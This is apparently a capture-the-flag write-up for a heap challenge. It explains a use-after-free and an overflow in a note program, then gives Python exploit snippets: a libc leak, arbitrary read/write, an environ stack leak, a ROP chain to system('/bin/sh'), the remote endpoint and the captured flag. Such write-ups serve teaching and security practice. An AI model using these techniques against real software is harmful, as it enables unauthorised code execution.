# Average Heap Challenge

**Category:** pwn  
**Remote:** `nc 34.62.69.250 41070`  
**Flag:** `0xV01D{b07c224045fa044cbacd71d056a626d0}`

## Protections

```text
Full RELRO
Canary found
NX enabled
PIE enabled
```

The challenge ships with its own `libc.so.6` and `ld-linux-x86-64.so.2`, so all libc offsets are stable.

## Bug

The program stores notes as heap metadata objects:

```c
struct note {
    size_t size;
    char *data;
};
```

`allocate` creates a `malloc(0x10)` note object and a separate user data chunk. The initial size is restricted to `0x18 <= size <= 0x408`.

There are two important bugs:

1. `free` only frees `note->data`; it does not clear the note pointer and does not free the note metadata object. This gives a UAF for printing freed chunks.
2. `edit` accepts a new size without applying the original allocation bounds, writes it into `note->size`, then calls `read(0, note->data, note->size)`. This gives an overflow from any existing data chunk.

## Libc Leak

To leak libc, fill the `0x410` tcache bin and then free one more `0x408` allocation into the unsorted bin.

The exploit allocates eight `0x408` chunks and one small guard chunk, then frees seven large chunks to fill tcache and frees the eighth:

```python
for _ in range(8):
    alloc(io, 0x408, b"C" * 8)
alloc(io, 0x18, b"G" * 0x18)
for i in range(2, 9):
    free(io, i)
free(io, 9)
```

Because the note pointer is still live, `print` on the freed unsorted-bin chunk leaks its `fd` pointer. On the provided libc, that pointer is `main_arena + 0x60`, so:

```python
libc.address = unsorted_leak - 0x219ce0
```

## Arbitrary Read/Write

Two small notes are allocated first. Their heap layout is convenient:

```text
note0 metadata
note0 data
note1 metadata
note1 data
```

Since `edit(0, new_size, data)` can write past `note0`'s data chunk, it can overwrite `note1`'s metadata. The payload preserves the next chunk size field and replaces `note1->size` and `note1->data`:

```python
payload = flat(
    b"A" * 0x18,
    0x21,
    size,
    ptr,
)
edit(io, 0, len(payload), payload)
```

After this:

```python
show(1)       # arbitrary read from ptr
edit(1, ...)  # arbitrary write to ptr
```

This creates clean arbitrary read and write primitives.

## Stack Leak

With libc known, leak `environ` to find the stack:

```python
environ = u64(arb_read(io, libc.sym["environ"], 8))
```

Then scan a small range below `environ` for the saved return address into libc. The exploit searches for `libc + 0x29d90`, the return site after `main`:

```python
if val - libc.address == 0x29d90:
    main_ret = scan_start + off
```

The saved return address for the next `edit` call is consistently `main_ret - 0x20` in this binary:

```python
edit_ret = main_ret - 0x20
```

## Code Execution

The final arbitrary write places a small ROP chain on the saved return address of the active `edit` call:

```python
chain = flat(
    ret,
    pop_rdi,
    next(libc.search(b"/bin/sh\0")),
    libc.sym["system"],
)
arb_write(io, edit_ret, chain)
```

When `edit` returns, execution becomes:

```text
system("/bin/sh")
```

Then commands can be sent to the shell.

## Running

Local test:

```bash
python3 solve.py TEST
```

Remote shell:

```bash
python3 solve.py REMOTE
```

One-shot flag command:

```bash
python3 solve.py REMOTE CMD='cat flag*; cat /flag*'
```

Output:

```text
0xV01D{b07c224045fa044cbacd71d056a626d0}
```
